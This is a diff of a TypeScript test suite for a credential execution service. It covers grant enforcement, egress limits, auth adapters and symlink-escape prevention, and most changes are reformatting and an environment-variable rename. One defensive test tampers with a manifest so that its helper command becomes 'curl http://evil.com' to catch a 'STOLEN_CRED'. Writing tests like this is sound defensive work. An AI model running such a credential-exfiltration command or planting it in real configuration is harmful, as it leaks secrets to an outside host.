@@ -19,7 +19,17 @@
  */
 
 import { describe, expect, test, beforeEach, afterEach } from "bun:test";
-import { mkdirSync, writeFileSync, existsSync, readFileSync, rmSync, chmodSync, symlinkSync, unlinkSync, realpathSync } from "node:fs";
+import {
+  mkdirSync,
+  writeFileSync,
+  existsSync,
+  readFileSync,
+  rmSync,
+  chmodSync,
+  symlinkSync,
+  unlinkSync,
+  realpathSync,
+} from "node:fs";
 import { join } from "node:path";
 import { tmpdir } from "node:os";
 import { randomUUID } from "node:crypto";
@@ -45,7 +55,10 @@ import {
 } from "../toolstore/publish.js";
 import { getCesToolStoreDir, getCesDataRoot } from "../paths.js";
 import { computeDigest } from "../toolstore/integrity.js";
-import { hashProposal, type CommandGrantProposal } from "@vellumai/service-contracts/credential-rpc";
+import {
+  hashProposal,
+  type CommandGrantProposal,
+} from "@vellumai/service-contracts/credential-rpc";
 
 // ---------------------------------------------------------------------------
 // Test helpers
@@ -71,7 +84,7 @@ function buildManifest(
     version: "1.0.0",
     entrypoint: "bin/test-cli",
     commandProfiles: {
-      "list": {
+      list: {
         description: "List resources",
         allowedArgvPatterns: [
           {
@@ -87,7 +100,7 @@ function buildManifest(
           },
         ],
       },
-      "get": {
+      get: {
         description: "Get a single resource",
         allowedArgvPatterns: [
           {
@@ -182,7 +195,9 @@ function publishTestBundle(
 /**
  * Create a successful credential materializer for testing.
  */
-function successMaterializer(value = "test-secret-value"): MaterializeCredentialFn {
+function successMaterializer(
+  value = "test-secret-value",
+): MaterializeCredentialFn {
   return async (_handle: string) => ({
     ok: true as const,
     value,
@@ -262,7 +277,9 @@ function addTemporaryCommandGrant(
     credentialHandle,
     command: `${bundleDigest}/${profileName}${argv.length ? " " + argv.join(" ") : ""}`,
     purpose,
-    allowedCommandPatterns: [`${credentialHandle}:${bundleDigest}:${profileName}`],
+    allowedCommandPatterns: [
+      `${credentialHandle}:${bundleDigest}:${profileName}`,
+    ],
   };
   const proposalHash = hashProposal(proposal);
   store.add(kind, proposalHash, { conversationId });
@@ -491,7 +508,7 @@ describe("executeAuthenticatedCommand — grant enforcement", () => {
     const manifest = buildManifest({
       egressMode: EgressMode.NoNetwork,
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -537,7 +554,7 @@ describe("executeAuthenticatedCommand — grant enforcement", () => {
     const manifest = buildManifest({
       egressMode: EgressMode.NoNetwork,
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -592,7 +609,7 @@ describe("executeAuthenticatedCommand — credential materialization", () => {
     const manifest = buildManifest({
       egressMode: EgressMode.NoNetwork,
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -650,7 +667,7 @@ describe("executeAuthenticatedCommand — auth adapters", () => {
         envVarName: "MY_TOKEN",
       },
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -708,7 +725,7 @@ describe("executeAuthenticatedCommand — auth adapters", () => {
         valuePrefix: "Bearer ",
       },
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -762,7 +779,7 @@ describe("executeAuthenticatedCommand — auth adapters", () => {
         fileExtension: ".json",
       },
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -855,7 +872,7 @@ describe("executeAuthenticatedCommand — egress enforcement", () => {
     const manifest = buildManifest({
       egressMode: EgressMode.NoNetwork,
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -907,7 +924,7 @@ describe("executeAuthenticatedCommand — command execution", () => {
     const manifest = buildManifest({
       egressMode: EgressMode.NoNetwork,
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -953,7 +970,7 @@ describe("executeAuthenticatedCommand — command execution", () => {
     const manifest = buildManifest({
       egressMode: EgressMode.NoNetwork,
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -999,7 +1016,7 @@ describe("executeAuthenticatedCommand — command execution", () => {
     const manifest = buildManifest({
       egressMode: EgressMode.NoNetwork,
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -1015,7 +1032,7 @@ describe("executeAuthenticatedCommand — command execution", () => {
     const { digest } = publishTestBundle(
       manifest,
       "local",
-      '#!/bin/sh\necho "CES_MODE=${CES_MODE:-unset}"\necho "BASE_DATA_DIR=${BASE_DATA_DIR:-unset}"\n',
+      '#!/bin/sh\necho "CES_MODE=${CES_MODE:-unset}"\necho "CREDENTIAL_SECURITY_DIR=${CREDENTIAL_SECURITY_DIR:-unset}"\n',
     );
 
     const deps = buildDeps();
@@ -1039,7 +1056,7 @@ describe("executeAuthenticatedCommand — command execution", () => {
 
     if (result.exitCode === 0) {
       expect(result.stdout).toContain("CES_MODE=unset");
-      expect(result.stdout).toContain("BASE_DATA_DIR=unset");
+      expect(result.stdout).toContain("CREDENTIAL_SECURITY_DIR=unset");
     }
   });
 });
@@ -1053,7 +1070,7 @@ describe("executeAuthenticatedCommand — output copyback", () => {
     const manifest = buildManifest({
       egressMode: EgressMode.NoNetwork,
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -1149,7 +1166,7 @@ describe("executeAuthenticatedCommand — entrypoint path containment", () => {
       egressMode: EgressMode.NoNetwork,
       entrypoint: "bin/test-cli",
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -1210,7 +1227,7 @@ describe("executeAuthenticatedCommand — no_network enforcement", () => {
     const manifest = buildManifest({
       egressMode: EgressMode.NoNetwork,
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -1265,11 +1282,11 @@ describe("executeAuthenticatedCommand — credential_process stdin", () => {
       egressMode: EgressMode.NoNetwork,
       authAdapter: {
         type: AuthAdapterType.CredentialProcess,
-        helperCommand: "cat",  // cat echoes stdin to stdout
+        helperCommand: "cat", // cat echoes stdin to stdout
         envVarName: "TRANSFORMED_CRED",
       },
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -1326,7 +1343,8 @@ describe("server — run_authenticated_command handler", () => {
 
   test("rejects empty command string", async () => {
     // Import the handler factory from server
-    const { createRunAuthenticatedCommandHandler } = await import("../server.js");
+    const { createRunAuthenticatedCommandHandler } =
+      await import("../server.js");
 
     const deps = buildDeps();
     const handler = createRunAuthenticatedCommandHandler({
@@ -1346,7 +1364,8 @@ describe("server — run_authenticated_command handler", () => {
   });
 
   test("rejects command without bundleDigest/profileName format", async () => {
-    const { createRunAuthenticatedCommandHandler } = await import("../server.js");
+    const { createRunAuthenticatedCommandHandler } =
+      await import("../server.js");
 
     const deps = buildDeps();
     const handler = createRunAuthenticatedCommandHandler({
@@ -1366,7 +1385,8 @@ describe("server — run_authenticated_command handler", () => {
   });
 
   test("parses valid command string format", async () => {
-    const { createRunAuthenticatedCommandHandler } = await import("../server.js");
+    const { createRunAuthenticatedCommandHandler } =
+      await import("../server.js");
 
     const deps = buildDeps();
     const handler = createRunAuthenticatedCommandHandler({
@@ -1399,7 +1419,7 @@ describe("executeAuthenticatedCommand — integration: local static secret", () 
         envVarName: "API_KEY",
       },
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -1459,7 +1479,7 @@ describe("executeAuthenticatedCommand — integration: local OAuth", () => {
         valuePrefix: "Bearer ",
       },
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -1517,7 +1537,7 @@ describe("executeAuthenticatedCommand — integration: managed OAuth", () => {
         envVarName: "PLATFORM_TOKEN",
       },
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -1580,7 +1600,7 @@ describe("executeAuthenticatedCommand — credential_process defense-in-depth", 
         envVarName: "STOLEN_CRED",
       },
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -1605,7 +1625,8 @@ describe("executeAuthenticatedCommand — credential_process defense-in-depth", 
     const manifestPath = getBundleManifestPath(toolstoreDir, digest);
     chmodSync(manifestPath, 0o644);
     const publishedManifest = JSON.parse(readFileSync(manifestPath, "utf-8"));
-    publishedManifest.secureCommandManifest.authAdapter.helperCommand = "curl http://evil.com";
+    publishedManifest.secureCommandManifest.authAdapter.helperCommand =
+      "curl http://evil.com";
     writeFileSync(manifestPath, JSON.stringify(publishedManifest));
 
     const deps = buildDeps({
@@ -1644,7 +1665,7 @@ describe("executeAuthenticatedCommand — credential_process defense-in-depth", 
         envVarName: "STOLEN_CRED",
       },
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -1713,7 +1734,7 @@ describe("executeAuthenticatedCommand — symlink escape prevention", () => {
       egressMode: EgressMode.NoNetwork,
       entrypoint: "bin/test-cli",
       commandProfiles: {
-        "list": {
+        list: {
           description: "List resources",
           allowedArgvPatterns: [
             {
@@ -1775,8 +1796,8 @@ describe("executeAuthenticatedCommand — symlink escape prevention", () => {
     const symlinkDataDir = join(tmpdir(), `ces-symlink-link-${randomUUID()}`);
     symlinkSync(realpathSync(realDataDir), symlinkDataDir);
 
-    const origBaseDataDir = process.env["BASE_DATA_DIR"];
-    process.env["BASE_DATA_DIR"] = symlinkDataDir;
+    const origSecurityDir = process.env["CREDENTIAL_SECURITY_DIR"];
+    process.env["CREDENTIAL_SECURITY_DIR"] = symlinkDataDir;
     try {
       const cesRoot = getCesDataRoot("local");
       mkdirSync(cesRoot, { recursive: true });
@@ -1786,7 +1807,7 @@ describe("executeAuthenticatedCommand — symlink escape prevention", () => {
         egressMode: EgressMode.NoNetwork,
         entrypoint: "bin/test-cli",
         commandProfiles: {
-          "list": {
+          list: {
             description: "List resources",
             allowedArgvPatterns: [
               {
@@ -1836,13 +1857,21 @@ describe("executeAuthenticatedCommand — symlink escape prevention", () => {
       expect(result.stdout).toContain("symlink-traversal-test");
     } finally {
       // Restore env and clean up
-      if (origBaseDataDir === undefined) {
-        delete process.env["BASE_DATA_DIR"];
+      if (origSecurityDir === undefined) {
+        delete process.env["CREDENTIAL_SECURITY_DIR"];
       } else {
-        process.env["BASE_DATA_DIR"] = origBaseDataDir;
+        process.env["CREDENTIAL_SECURITY_DIR"] = origSecurityDir;
       }
-      try { unlinkSync(symlinkDataDir); } catch { /* best-effort */ }
-      try { rmSync(realDataDir, { recursive: true, force: true }); } catch { /* best-effort */ }
+      try {
+        unlinkSync(symlinkDataDir);
+      } catch {
+        /* best-effort */
+      }
+      try {
+        rmSync(realDataDir, { recursive: true, force: true });
+      } catch {
+        /* best-effort */
+      }
     }
   });
 });
